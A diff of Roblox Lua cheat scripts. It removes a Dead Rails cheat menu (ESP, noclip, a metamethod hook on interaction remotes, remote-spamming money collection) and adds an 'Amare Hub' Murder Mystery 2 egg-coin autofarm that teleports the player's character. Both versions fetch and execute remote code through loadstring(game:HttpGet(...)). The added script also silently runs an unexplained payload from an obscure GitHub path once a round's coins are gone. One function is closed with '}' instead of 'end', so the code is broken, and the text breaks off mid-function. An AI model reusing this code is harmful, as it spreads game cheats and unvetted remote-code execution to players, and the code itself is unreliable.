@@ -1,652 +1,496 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
-local Window = Rayfield:CreateWindow({
-   Name = "khen.cc | Dead Rails",
-   Icon = 0,
-   LoadingTitle = "Dead Rails",
-   LoadingSubtitle = "by khen.cc",
-   Theme = "Default",
-   DisableRayfieldPrompts = true,
-   DisableBuildWarnings = true,
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil,
-      FileName = "khennn"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "noinvitelink",
-      RememberJoins = true
-   },
-   KeySystem = false -- Removed key system
-})
-
--- Services
-local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local Cam = workspace.CurrentCamera
-local UserInputService = game:GetService("UserInputService")
-local rs = game:GetService("ReplicatedStorage")
-local plr = LocalPlayer
-local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local GuiService = game:GetService("GuiService")
 
--- Create tabs
-local ESPTab = Window:CreateTab("ESP", "Eye") -- Icon eye
-local UtilityTab = Window:CreateTab("Utility", "Settings") -- Icon settings
-local VisualTab = Window:CreateTab("Visual", "Image") -- Icon image
+-- Script Credits
+-- Original by: Amare Scripts
+-- Modified by: Extra_Blox
 
--- ESP Variables
-local espCache = {}
-local espObjects = {}
-local espRefreshRate = 0.2 -- Refresh ESP every 0.2 seconds to reduce lag
-local espDistance = 2000 -- Maximum distance for ESP visibility
-local ESPEnabled = false
-local ESPPlayerEnabled = false
-local ESPZombyEnabled = false
-local ESPItemsEnabled = false
-local ESPTextSize = 12
-local ESPBoxesEnabled = true
-local ESPColor = Color3.fromRGB(255, 0, 0)
+-- Lock variable to prevent multiple script executions
+local isRunning = false
+local coinCollectorThread
+local hasReset = false -- Flag to track if the character has been reset
+local hasExecutedOnce = false -- Flag to ensure second script executes only once
+local isBagFull = false -- Flag to track if the egg bag is full
+local isRoundActive = false -- Flag to track if a round is currently active
 
--- Utility Variables
-local noClipEnabled = false
-local instantInteractEnabled = false
-local instantMoneyEnabled = false
-local autoTrainEnabled = false
+-- Default tween speed
+local TWEEN_SPEED = 20
+local TELEPORT_DISTANCE = 200
 
--- Visual Variables
-local fullBrightEnabled = false
-local originalBrightness = Lighting.Brightness
-local originalAmbient = Lighting.Ambient
-local originalOutdoorAmbient = Lighting.OutdoorAmbient
-
--- Optimized ESP System
-local function GetDistanceFromPlayer(position)
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return 9999 end
-    return (LocalPlayer.Character.HumanoidRootPart.Position - position).Magnitude
-end
-
-local function CreateOptimizedESP(object, objectType)
-    if not object or (not object:IsA("Model") and not object:IsA("BasePart")) then return end
-    if espCache[object] then return espCache[object] end
-    
-    -- Determine primary part
-    local primaryPart
-    if object:IsA("Model") and object:FindFirstChild("HumanoidRootPart") then
-        primaryPart = object.HumanoidRootPart
-    elseif object:IsA("Model") and object:FindFirstChild("PrimaryPart") then
-        primaryPart = object.PrimaryPart
-    elseif object:IsA("Model") and object:FindFirstChildOfClass("BasePart") then
-        primaryPart = object:FindFirstChildOfClass("BasePart")
-    elseif object:IsA("BasePart") then
-        primaryPart = object
-    else
-        return nil
-    end
-    
-    if not primaryPart then return nil end
-    
-    -- Determine object name
-    local objectName = object.Name
-    if objectType == "Player" and object.Parent and Players:GetPlayerFromCharacter(object) then
-        local player = Players:GetPlayerFromCharacter(object)
-        objectName = player.Name
-    elseif objectType == "Zombie" and object:FindFirstChild("Humanoid") then
-        local health = math.floor(object.Humanoid.Health)
-        objectName = object.Name .. " [" .. health .. " HP]"
-    end
-    
-    -- Create ESP components
-    local espFolder = Instance.new("Folder")
-    espFolder.Name = "ESP_" .. objectName
-    espFolder.Parent = game.CoreGui
-    
-    -- Simplified highlight instead of box ESP for performance
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "Highlight"
-    highlight.FillColor = 
-        objectType == "Player" and Color3.fromRGB(0, 0, 255) or
-        objectType == "Zombie" and Color3.fromRGB(255, 0, 0) or
-        Color3.fromRGB(0, 255, 0) -- Items
-    highlight.OutlineColor = highlight.FillColor
-    highlight.FillTransparency = 0.6
-    highlight.OutlineTransparency = 0
-    highlight.Adornee = object
-    highlight.Parent = espFolder
-    
-    -- Create name ESP
-    local billboardGui = Instance.new("BillboardGui")
-    billboardGui.Name = "NameESP"
-    billboardGui.Adornee = primaryPart
-    billboardGui.Size = UDim2.new(0, 100, 0, 40)
-    billboardGui.StudsOffset = Vector3.new(0, 2, 0)
-    billboardGui.AlwaysOnTop = true
-    billboardGui.Parent = espFolder
-    
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Name = "NameLabel"
-    nameLabel.Text = objectName
-    nameLabel.Size = UDim2.new(1, 0, 1, 0)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.TextColor3 = highlight.FillColor
-    nameLabel.TextStrokeTransparency = 0.3
-    nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-    nameLabel.TextSize = ESPTextSize
-    nameLabel.Font = Enum.Font.SourceSansBold
-    nameLabel.Parent = billboardGui
-    
-    -- Update function to handle ESP visibility
-    local function UpdateESPVisibility()
-        if not object or not object.Parent or not primaryPart or not primaryPart.Parent then
-            if espFolder and espFolder.Parent then
-                espFolder:Destroy()
+-- Improved function to check if Easter bag is full
+local function checkIfBagIsFull()
+    -- Method 1: Check GUI elements
+    local success, result = pcall(function()
+        local player = Players.LocalPlayer
+        if not player then return false end
+        
+        -- Check player GUI first
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            local mainGUI = playerGui:FindFirstChild("MainGUI")
+            if mainGUI then
+                local lobby = mainGUI:FindFirstChild("Lobby")
+                if lobby then
+                    local dock = lobby:FindFirstChild("Dock")
+                    if dock then
+                        local coinBags = dock:FindFirstChild("CoinBags")
+                        if coinBags then
+                            local eggContainer = coinBags:FindFirstChild("Egg")
+                            if eggContainer then
+                                local fullBagIcon = eggContainer:FindFirstChild("FullBagIcon")
+                                if fullBagIcon and fullBagIcon.Visible then
+                                    return true
+                                end
+                            end
+                        end
+                    end
+                end
             end
-            if espCache[object] then
-                espCache[object] = nil
+        end
+        
+        -- Also check ReplicatedStorage as a backup
+        local mainGUI = ReplicatedStorage:FindFirstChild("MainGUI")
+        if mainGUI then
+            local lobby = mainGUI:FindFirstChild("Lobby")
+            if lobby then
+                local dock = lobby:FindFirstChild("Dock")
+                if dock then
+                    local coinBags = dock:FindFirstChild("CoinBags")
+                    if coinBags then
+                        local eggContainer = coinBags:FindFirstChild("Egg")
+                        if eggContainer then
+                            local fullBagIcon = eggContainer:FindFirstChild("FullBagIcon")
+                            if fullBagIcon and fullBagIcon.Visible then
+                                return true
+                            end
+                        end
+                    end
+                end
             end
-            return false
         end
         
-        local distance = GetDistanceFromPlayer(primaryPart.Position)
-        
-        if distance > espDistance then
-            espFolder.Enabled = false
-            return true
-        end
-        
-        -- Update health for zombies
-        if objectType == "Zombie" and object:FindFirstChild("Humanoid") then
-            nameLabel.Text = object.Name .. " [" .. math.floor(object.Humanoid.Health) .. " HP]"
-        end
-        
-        -- Scale text size based on distance for better visibility
-        local scaleFactor = math.clamp(1 - (distance / espDistance), 0.5, 1)
-        nameLabel.TextSize = ESPTextSize * scaleFactor
-        
-        -- Set visibility based on type and toggle
-        if objectType == "Player" then
-            espFolder.Enabled = ESPEnabled and ESPPlayerEnabled
-        elseif objectType == "Zombie" then
-            espFolder.Enabled = ESPEnabled and ESPZombyEnabled
-        else
-            espFolder.Enabled = ESPEnabled and ESPItemsEnabled
-        end
-        
+        return false
+    end)
+    
+    if success and result then
         return true
     end
     
-    espCache[object] = {
-        Folder = espFolder,
-        PrimaryPart = primaryPart,
-        Type = objectType,
-        Update = UpdateESPVisibility
+    -- Method 2: Check if there are any visible Egg coin counters showing full
+    local success2, result2 = pcall(function()
+        local player = Players.LocalPlayer
+        if not player then return false end
+        
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            -- Check for coin counter text that might indicate fullness
+            for _, gui in pairs(playerGui:GetDescendants()) do
+                if gui:IsA("TextLabel") and gui.Visible then
+                    local text = gui.Text
+                    -- Look for patterns like "10/10" indicating full bag
+                    if string.match(text, "(%d+)/(%d+)") then
+                        local current, max = string.match(text, "(%d+)/(%d+)")
+                        if tonumber(current) and tonumber(max) and tonumber(current) >= tonumber(max) then
+                            return true
+                        end
+                    end
+                end
+            end
+        end
+        
+        return false
+    end)
+    
+    return (success2 and result2) or isBagFull
+end
+
+-- Function to execute the coin collection script
+local function startCoinCollector()
+    if isRunning then return end
+    isRunning = true
+
+    -- Get the local player
+    local localPlayer = Players.LocalPlayer
+
+    -- Function to get the current character and ensure it's fully loaded
+    local function getCharacter()
+        return localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    end
+
+    -- Initialize character and humanoidRootPart
+    local function initializeCharacter()
+        local character = getCharacter()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+        local humanoid = character:WaitForChild("Humanoid", 5)
+        return character, humanoidRootPart, humanoid
+    end
+
+    -- Variables for character and humanoid
+    local character, humanoidRootPart, humanoid = initializeCharacter()
+
+    if not humanoidRootPart then
+        isRunning = false
+        return
+    end
+
+    if not humanoid then
+        isRunning = false
+        return
+    end
+
+    -- List of possible maps and their CoinContainer paths
+    local mapPaths = {
+        "IceCastle",
+        "SkiLodge",
+        "Station",
+        "LogCabin",
+        "Bank2",
+        "BioLab",
+        "House2",
+        "Factory",
+        "Hospital3",
+        "Hotel",
+        "Mansion2",
+        "MilBase",
+        "Office3",
+        "PoliceStation",
+        "Workplace",
+        "ResearchFacility",
+        "ChristmasItaly"
     }
-    
-    return espCache[object]
+
+    -- Keep track of visited coins to prevent revisiting
+    local visitedCoins = {}
+
+    -- Function to find the active map's CoinContainer
+    local function findActiveCoinContainer()
+        for _, mapName in ipairs(mapPaths) do
+            local map = Workspace:FindFirstChild(mapName)
+            if map then
+                local coinContainer = map:FindFirstChild("CoinContainer")
+                if coinContainer then
+                    return coinContainer
+                end
+            end
+        end
+        return nil
+    end
+
+    -- Function to find the nearest Egg coin
+    local function findNearestCoin(coinContainer)
+        local nearestCoin = nil
+        local shortestDistance = math.huge
+
+        if coinContainer then
+            for _, coin in ipairs(coinContainer:GetChildren()) do
+                -- Check if it's a Coin_Server with CoinID attribute set to "Egg"
+                if coin:IsA("BasePart") and coin.Name == "Coin_Server" and 
+                   coin:GetAttribute("CoinID") == "Egg" and not visitedCoins[coin] then
+                    local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+                    if distance < shortestDistance then
+                        shortestDistance = distance
+                        nearestCoin = coin
+                    end
+                end
+            end
+        end
+
+        return nearestCoin
+    end
+
+    -- Function to teleport to a coin
+    local function teleportToCoin(coin)
+        if coin then
+            humanoidRootPart.CFrame = CFrame.new(coin.Position)
+            visitedCoins[coin] = true -- Mark the coin as visited
+        end
+    end
+
+    -- Function to tween to a coin
+    local function tweenToCoin(coin)
+        if coin then
+            visitedCoins[coin] = true -- Mark the coin as visited
+            local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+            local tweenInfo = TweenInfo.new(distance / TWEEN_SPEED, Enum.EasingStyle.Linear)
+            local goal = {CFrame = CFrame.new(coin.Position)}
+            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
+            tween:Play()
+
+            -- When the tween starts, enable auto reset
+            hasReset = false -- Allow reset once the tween starts
+
+            tween.Completed:Wait() -- Wait for the tween to finish
+        end
+    end
+
+    -- Function to play falling animation
+    local function playFallingAnimation()
+        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
+        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+    end
+
+    -- Function to check if all Egg coins are gone and reset character
+    local function checkForAllEggCoinsGone()
+        local coinContainer = findActiveCoinContainer()
+
+        if coinContainer then
+            local allEggCoinsGone = true
+
+            -- Check if any Egg coin still exists
+            for _, coin in ipairs(coinContainer:GetChildren()) do
+                if coin:IsA("BasePart") and coin.Name == "Coin_Server" and 
+                   coin:GetAttribute("CoinID") == "Egg" then
+                    allEggCoinsGone = false
+                    break
+                end
+            end
+
+            -- If all Egg coins are gone and the character has not reset, reset the character
+            if allEggCoinsGone and not hasReset then
+                character:BreakJoints() -- Reset character
+                visitedCoins = {} -- Reset visited coins to allow collection again
+                hasReset = true -- Set the reset flag
+                wait(1) -- Wait before continuing after reset
+            end
+
+            -- If all Egg coins are gone, execute the second script once
+            if allEggCoinsGone and not hasExecutedOnce then
+                hasExecutedOnce = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezqhs/-/refs/heads/main/auxqvoa"))()
+            end
+
+            -- Stop teleporting and tweening if all Egg coins are gone
+            if allEggCoinsGone then
+                isRunning = false
+            end
+        end
+    end
+
+    -- Main function to tween or teleport to nearest coins with regular bag checks
+    local function collectCoins()
+        while isRunning do
+            -- If round is not active, just wait
+            if not isRoundActive then
+                wait(1)
+                continue
+            end
+            
+            -- Check if bag is full every iteration
+            if checkIfBagIsFull() then
+                print("Egg bag is full! Stopping farm until next round.")
+                isBagFull = true
+                isRunning = false
+                break
+            end
+            
+            -- Ensure the character and humanoid are initialized
+            if not character or not humanoidRootPart or not humanoid or not character.Parent then
+                character, humanoidRootPart, humanoid = initializeCharacter()
+            end
+
+            -- Find the active map's CoinContainer
+            local coinContainer = findActiveCoinContainer()
+            if not coinContainer then
+                -- Don't warn, just wait silently for the round to start
+                wait(1)
+                continue
+            end
+
+            -- Find the nearest Egg coin
+            local targetCoin = findNearestCoin(coinContainer)
+            if not targetCoin then
+                -- Don't warn, just wait silently
+                wait(1)
+                continue
+            end
+
+            -- Check if all Egg coins are gone and stop if necessary
+            checkForAllEggCoinsGone()
+            if not isRunning then break end -- Stop the loop if all Egg coins are gone
+
+            -- Check distance and decide whether to teleport or tween
+            local distanceToCoin = (humanoidRootPart.Position - targetCoin.Position).Magnitude
+            if distanceToCoin >= TELEPORT_DISTANCE then
+                teleportToCoin(targetCoin)
+            else
+                tweenToCoin(targetCoin)
+            end
+
+            -- Play falling animation during tween
+            playFallingAnimation()
+
+            -- Check if all Egg coins are gone and reset if necessary
+            checkForAllEggCoinsGone()
+            
+            -- Double check bag fullness after collection
+            if checkIfBagIsFull() then
+                print("Egg bag is full after collection! Stopping farm until next round.")
+                isBagFull = true
+                isRunning = false
+                break
+            end
+
+            wait(0.01) -- Add a small wait to prevent script from running too quickly
+        end
+    end
+
+    -- Start the coin collection process
+    collectCoins()
 end
 
-local function UpdateAllESP()
-    -- Clean up invalid ESP objects
-    for object, esp in pairs(espCache) do
-        if not object or not object.Parent or not esp.Update() then
-            if esp.Folder and esp.Folder.Parent then
-                esp.Folder:Destroy()
-            end
-            espCache[object] = nil
-        end
-    end
-    
-    if not ESPEnabled then return end
-    
-    -- Update Player ESP
-    if ESPPlayerEnabled then
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                CreateOptimizedESP(player.Character, "Player")
-            end
-        end
-    end
-    
-    -- Update Zombie ESP
-    if ESPZombyEnabled then
-        local zombieFolders = {"NightEnemies", "Zombies", "Enemies", "NPCs"}
-        
-        for _, folderName in ipairs(zombieFolders) do
-            local folder = workspace:FindFirstChild(folderName)
-            if folder then
-                for _, zombie in ipairs(folder:GetChildren()) do
-                    if zombie:IsA("Model") and zombie:FindFirstChild("Humanoid") then
-                        CreateOptimizedESP(zombie, "Zombie")
-                    end
-                end
-            end
-        end
-        
-        -- Look for zombies in workspace
-        for _, obj in ipairs(workspace:GetChildren()) do
-            if obj:IsA("Model") and obj:FindFirstChild("Humanoid") and
-               not Players:GetPlayerFromCharacter(obj) and
-               (string.find(string.lower(obj.Name), "zombie") or
-                string.find(string.lower(obj.Name), "enemy")) then
-                CreateOptimizedESP(obj, "Zombie")
-            end
-        end
-    end
-    
-    -- Update Items ESP
-    if ESPItemsEnabled then
-        local runtimeItems = workspace:FindFirstChild("RuntimeItems")
-        if runtimeItems then
-            for _, item in ipairs(runtimeItems:GetDescendants()) do
-                if (item:IsA("Model") or item:IsA("Part") or item:IsA("MeshPart")) and
-                   not item:FindFirstChild("Humanoid") then
-                    CreateOptimizedESP(item, "Item")
-                end
-            end
-        end
-        
-        -- Look for potentially valuable items in workspace
-        local valuableKeywords = {"money", "cash", "gold", "weapon", "ammo", "gun", "item", "pickup", "collectible"}
-        for _, obj in ipairs(workspace:GetDescendants()) do
-            if (obj:IsA("Model") or obj:IsA("Part") or obj:IsA("MeshPart")) and
-               not obj:FindFirstChild("Humanoid") then
-                local lowerName = string.lower(obj.Name)
-                for _, keyword in ipairs(valuableKeywords) do
-                    if string.find(lowerName, keyword) then
-                        CreateOptimizedESP(obj, "Item")
-                        break
-                    end
-                end
-            end
-        end
+-- Function to stop the coin collector
+local function stopCoinCollector()
+    isRunning = false
+    if coinCollectorThread then
+        coinCollectorThread:Disconnect()
+        coinCollectorThread = nil
     end
 end
 
--- NoClip Function
-local function SetNoClip(enabled)
-    if enabled then
-        RunService:BindToRenderStep("NoClip", 0, function()
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid:ChangeState(11) -- 11 is the enum for Enum.HumanoidStateType.Physics
-                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = false
-                    end
+-- Function to handle new round detection
+local function onNewRound()
+    print("New round detected! Resetting farm status...")
+    -- Reset flags when a new round starts
+    hasReset = false
+    hasExecutedOnce = false
+    isBagFull = false
+    isRoundActive = true
+
+    -- Start the coin collector again if auto-farm is enabled
+    local autoFarmToggle = _G.AutoFarmEnabled or false
+    if autoFarmToggle and not isRunning then
+        print("Auto-farm is enabled, starting coin collector...")
+        coinCollectorThread = game:GetService("RunService").Heartbeat:Connect(startCoinCollector)
+    end
+end
+
+-- Handle round end
+local function onRoundEnd()
+    print("Round ended. Stopping farm until next round...")
+    isRoundActive = false
+    stopCoinCollector()
+}
+
+-- Setup better bag full detection with multiple methods
+local function setupBagFullDetection()
+    -- Method 1: Listen for CoinCollected events
+    local function setupCoinCollectedEvent()
+        local remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
+        if not remotes then return end
+        
+        local gameplay = remotes:WaitForChild("Gameplay", 5)
+        if not gameplay then return end
+        
+        local coinCollectedEvent = gameplay:WaitForChild("CoinCollected", 5)
+        if not coinCollectedEvent then return end
+        
+        coinCollectedEvent.OnClientEvent:Connect(function(coinType, currentAmount, maxAmount)
+            if coinType == "Egg" then
+                print("Egg collection update:", currentAmount, "/", maxAmount)
+                if currentAmount >= maxAmount then
+                    print("Egg bag is now full! Stopping farm.")
+                    isBagFull = true
+                    isRunning = false
+                    stopCoinCollector()
                 end
             end
         end)
-    else
-        RunService:UnbindFromRenderStep("NoClip")
-        if LocalPlayer.Character then
-            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-                    part.CanCollide = true
-                end
-            end
-        end
-    end
-end
-
--- Instant Interact Function
-local function SetupInstantInteract()
-    local oldNamecall
-    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local args = {...}
-        local method = getnamecallmethod()
-        
-        if instantInteractEnabled and method == "FireServer" and (self.Name == "Interact" or string.find(self.Name:lower(), "interact")) then
-            -- Modify interaction time to 0 or bypass interaction checks
-            for i, v in pairs(args) do
-                if typeof(v) == "number" and v > 0 then
-                    args[i] = 0
-                end
-            end
-            return oldNamecall(self, unpack(args))
-        end
-        
-        return oldNamecall(self, ...)
-    end)
-end
-
--- Instant Money Collection
-local function SetupInstantMoneyCollection()
-    local function findMoneyCollectionRemote()
-        local possibleRemotes = {}
-        
-        for _, remote in pairs(rs:GetDescendants()) do
-            if remote:IsA("RemoteEvent") and (string.find(remote.Name:lower(), "money") or 
-                                              string.find(remote.Name:lower(), "collect") or
-                                              string.find(remote.Name:lower(), "currency") or
-                                              string.find(remote.Name:lower(), "pickup")) then
-                table.insert(possibleRemotes, remote)
-            end
-        end
-        
-        return possibleRemotes
-    end
-
-    local moneyRemotes = findMoneyCollectionRemote()
-    
-    RunService.Heartbeat:Connect(function()
-        if instantMoneyEnabled then
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if (obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("Model")) and 
-                   (string.find(string.lower(obj.Name), "money") or 
-                    string.find(string.lower(obj.Name), "cash") or 
-                    string.find(string.lower(obj.Name), "coin") or
-                    string.find(string.lower(obj.Name), "collect")) then
-                    
-                    -- Try all possible remotes
-                    for _, remote in pairs(moneyRemotes) do
-                        remote:FireServer(obj)
-                    end
-                    
-                    -- Also try direct interaction
-                    if obj:FindFirstChild("ProximityPrompt") then
-                        fireproximityprompt(obj.ProximityPrompt)
-                    end
-                end
-            end
-        end
-    end)
-end
-
--- Auto Train Driving
-local function SetupAutoTrainDriving()
-    local function findTrainDriveRemote()
-        local possibleRemotes = {}
-        
-        for _, remote in pairs(rs:GetDescendants()) do
-            if remote:IsA("RemoteEvent") and (string.find(remote.Name:lower(), "train") or 
-                                              string.find(remote.Name:lower(), "drive") or
-                                              string.find(remote.Name:lower(), "vehicle") or
-                                              string.find(remote.Name:lower(), "control")) then
-                table.insert(possibleRemotes, remote)
-            end
-        end
-        
-        return possibleRemotes
     end
     
-    local trainRemotes = findTrainDriveRemote()
-    
-    RunService.Heartbeat:Connect(function()
-        if autoTrainEnabled and LocalPlayer.Character then
-            local trains = {}
-            
-            -- Find all possible trains
-            for _, obj in pairs(workspace:GetDescendants()) do
-                if (obj:IsA("Model") or obj:IsA("Part")) and 
-                   (string.find(string.lower(obj.Name), "train") or
-                    string.find(string.lower(obj.Name), "locomotive") or
-                    string.find(string.lower(obj.Name), "rail") or
-                    string.find(string.lower(obj.Name), "vehicle")) then
-                    table.insert(trains, obj)
+    -- Method 2: Create a periodic check for UI changes
+    local function startPeriodicUICheck()
+        spawn(function()
+            while true do
+                wait(1) -- Check every second
+                if isRunning and checkIfBagIsFull() then
+                    print("Periodic check: Egg bag is full! Stopping farm.")
+                    isBagFull = true
+                    isRunning = false
+                    stopCoinCollector()
                 end
-            end
-            
-            -- Try to drive each possible train
-            for _, train in pairs(trains) do
-                for _, remote in pairs(trainRemotes) do
-                    remote:FireServer(train, "Drive", true)
-                    remote:FireServer(train, "Start")
-                    remote:FireServer(train, "Accelerate", 1)
-                end
-                
-                -- Also try direct interaction
-                if train:FindFirstChild("ProximityPrompt") then
-                    fireproximityprompt(train.ProximityPrompt)
-                end
-            end
-        end
-    end)
-end
-
--- Full Bright Function
-local function SetFullBright(enabled)
-    if enabled then
-        Lighting.Brightness = 2
-        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
-        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
-        Lighting.GlobalShadows = false
-        
-        for _, effect in pairs(Lighting:GetChildren()) do
-            if effect:IsA("BlurEffect") or 
-               effect:IsA("ColorCorrectionEffect") or 
-               effect:IsA("BloomEffect") or 
-               effect:IsA("SunRaysEffect") then
-                effect.Enabled = false
-            end
-        end
-        
-        -- Create or update full bright atmosphere
-        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere") or Instance.new("Atmosphere", Lighting)
-        atmosphere.Density = 0
-        atmosphere.Glare = 0
-        atmosphere.Haze = 0
-    else
-        Lighting.Brightness = originalBrightness
-        Lighting.Ambient = originalAmbient
-        Lighting.OutdoorAmbient = originalOutdoorAmbient
-        Lighting.GlobalShadows = true
-        
-        for _, effect in pairs(Lighting:GetChildren()) do
-            if effect:IsA("BlurEffect") or 
-               effect:IsA("ColorCorrectionEffect") or 
-               effect:IsA("BloomEffect") or 
-               effect:IsA("SunRaysEffect") then
-                effect.Enabled = true
-            end
-        end
-        
-        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
-        if atmosphere then
-            atmosphere:Destroy()
-        end
-    end
-end
-
--- ESP Tab
-local ESPToggle = ESPTab:CreateToggle({
-    Name = "Master ESP Toggle",
-    CurrentValue = false,
-    Flag = "ESPToggle",
-    Callback = function(Value)
-        ESPEnabled = Value
-        if not Value then
-            for _, esp in pairs(espCache) do
-                if esp.Folder then
-                    esp.Folder.Enabled = false
-                end
-            end
-        else
-            UpdateAllESP()
-        end
-    end,
-})
-
-local PlayerESPToggle = ESPTab:CreateToggle({
-    Name = "Player ESP",
-    CurrentValue = false,
-    Flag = "PlayerESPToggle",
-    Callback = function(Value)
-        ESPPlayerEnabled = Value
-        UpdateAllESP()
-    end,
-})
-
-local ZombieESPToggle = ESPTab:CreateToggle({
-    Name = "Zombie ESP",
-    CurrentValue = false,
-    Flag = "ZombieESPToggle",
-    Callback = function(Value)
-        ESPZombyEnabled = Value
-        UpdateAllESP()
-    end,
-})
-
-local ItemESPToggle = ESPTab:CreateToggle({
-    Name = "Items ESP",
-    CurrentValue = false,
-    Flag = "ItemESPToggle",
-    Callback = function(Value)
-        ESPItemsEnabled = Value
-        UpdateAllESP()
-    end,
-})
-
-ESPTab:CreateSlider({
-    Name = "ESP Distance",
-    Range = {100, 5000},
-    Increment = 100,
-    Suffix = "studs",
-    CurrentValue = 2000,
-    Flag = "ESPDistanceSlider",
-    Callback = function(Value)
-        espDistance = Value
-    end,
-})
-
-ESPTab:CreateSlider({
-    Name = "ESP Text Size",
-    Range = {8, 20},
-    Increment = 1,
-    Suffix = "px",
-    CurrentValue = 12,
-    Flag = "ESPTextSlider",
-    Callback = function(Value)
-        ESPTextSize = Value
-        UpdateAllESP()
-    end,
-})
-
-ESPTab:CreateSlider({
-    Name = "ESP Refresh Rate",
-    Range = {0.1, 2},
-    Increment = 0.1,
-    Suffix = "s",
-    CurrentValue = 0.2,
-    Flag = "ESPRefreshSlider",
-    Callback = function(Value)
-        espRefreshRate = Value
-    end,
-})
-
-ESPTab:CreateButton({
-    Name = "Refresh ESP (Force Update)",
-    Callback = function()
-        -- Clean ESP cache to force rebuild
-        for object, esp in pairs(espCache) do
-            if esp.Folder and esp.Folder.Parent then
-                esp.Folder:Destroy()
-            end
-        end
-        espCache = {}
-        UpdateAllESP()
-    end,
-})
-
--- Utility Tab
-local NoClipToggle = UtilityTab:CreateToggle({
-    Name = "NoClip",
-    CurrentValue = false,
-    Flag = "NoClipToggle",
-    Callback = function(Value)
-        noClipEnabled = Value
-        SetNoClip(Value)
-    end,
-})
-
-local InstantInteractToggle = UtilityTab:CreateToggle({
-    Name = "Instant Interact",
-    CurrentValue = false,
-    Flag = "InstantInteractToggle",
-    Callback = function(Value)
-        instantInteractEnabled = Value
-    end,
-})
-
-local InstantMoneyToggle = UtilityTab:CreateToggle({
-    Name = "Auto Collect Money",
-    CurrentValue = false,
-    Flag = "InstantMoneyToggle",
-    Callback = function(Value)
-        instantMoneyEnabled = Value
-    end,
-})
-
-local AutoTrainToggle = UtilityTab:CreateToggle({
-    Name = "Auto Drive Train",
-    CurrentValue = false,
-    Flag = "AutoTrainToggle",
-    Callback = function(Value)
-        autoTrainEnabled = Value
-    end,
-})
-
--- Visual Tab
-local FullBrightToggle = VisualTab:CreateToggle({
-    Name = "Full Bright",
-    CurrentValue = false,
-    Flag = "FullBrightToggle",
-    Callback = function(Value)
-        fullBrightEnabled = Value
-        SetFullBright(Value)
-    end,
-})
-
-
--- Setup connections
-local espUpdateConnection
-espUpdateConnection = RunService.Heartbeat:Connect(function()
-    if ESPEnabled then
-        -- Only update ESP at the specified refresh rate to reduce lag
-        if not espUpdateConnection.Connected then return end
-        espUpdateConnection:Disconnect()
-        UpdateAllESP()
-        wait(espRefreshRate)
-        espUpdateConnection = RunService.Heartbeat:Connect(function()
-            if ESPEnabled then
-                if not espUpdateConnection.Connected then return end
-                espUpdateConnection:Disconnect()
-                UpdateAllESP()
-                wait(espRefreshRate)
-                espUpdateConnection = RunService.Heartbeat:Connect(function() end)
             end
         end)
+    end
+    
+    -- Start both detection methods
+    setupCoinCollectedEvent()
+    startPeriodicUICheck()
+end
+
+-- GUI to toggle auto farm and speed
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+local AmareHubWindow = Library:NewWindow("Amare Hub - MM2")
+local KillingCheats = AmareHubWindow:NewSection("AutoFarm Options")
+local CreditsSection = AmareHubWindow:NewSection("Credits: Amare Scripts")
+local YouTubeSection = AmareHubWindow:NewSection("Modified By Extra_Blox")
+
+-- Global variable to track toggle state
+_G.AutoFarmEnabled = false
+
+-- Toggle for Auto Farm
+KillingCheats:CreateToggle("Auto Farm Egg Coins", function(value)
+    _G.AutoFarmEnabled = value
+    if value then
+        if not isRunning and not isBagFull then
+            print("Starting egg coin farming...")
+            coinCollectorThread = game:GetService("RunService").Heartbeat:Connect(startCoinCollector)
+        elseif isBagFull then
+            print("Cannot start farming - Egg bag is already full!")
+        end
+    else
+        print("Stopping egg coin farming...")
+        stopCoinCollector()
     end
 end)
 
--- Check for new players
-Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function(character)
-        if ESPEnabled and ESPPlayerEnabled then
-            CreateOptimizedESP(character, "Player")
-        end
-    end)
+-- Button to force reset bag full status
+KillingCheats:CreateButton("Force Reset Bag Status", function()
+    isBagFull = false
+    print("Bag status reset - you can restart farming if needed")
 end)
 
--- Initialize the existing player characters
-for _, player in pairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer and player.Character then
-        player.CharacterAdded:Connect(function(character)
-            if ESPEnabled and ESPPlayerEnabled then
-                CreateOptimizedESP(character, "Player")
